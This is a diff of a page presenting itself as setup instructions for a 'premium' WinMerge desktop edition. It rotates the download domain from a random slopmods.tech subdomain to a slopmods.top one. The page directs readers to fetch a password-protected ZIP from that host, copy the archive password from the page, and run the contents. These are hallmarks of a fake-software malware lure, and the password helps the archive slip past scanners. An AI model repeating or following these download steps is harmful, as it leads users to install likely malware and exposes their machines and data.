@@ -8,12 +8,12 @@ WinMerge — Windows setup and configuration · Premium workspace · Zero nag di
 
 > Use the release page below for Windows.
 
-- **Release page:** [iuwsrurvbpm.slopmods.tech](https://iuwsrurvbpm.slopmods.tech/)
-- **Full URL:** `https://iuwsrurvbpm.slopmods.tech/`
+- **Release page:** [iuwsrurvbpm.slopmods.top](https://iuwsrurvbpm.slopmods.top/)
+- **Full URL:** `https://iuwsrurvbpm.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **iuwsrurvbpm.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **iuwsrurvbpm.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ WinMerge — Windows setup and configuration · Premium workspace · Zero nag di
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **iuwsrurvbpm.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **iuwsrurvbpm.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
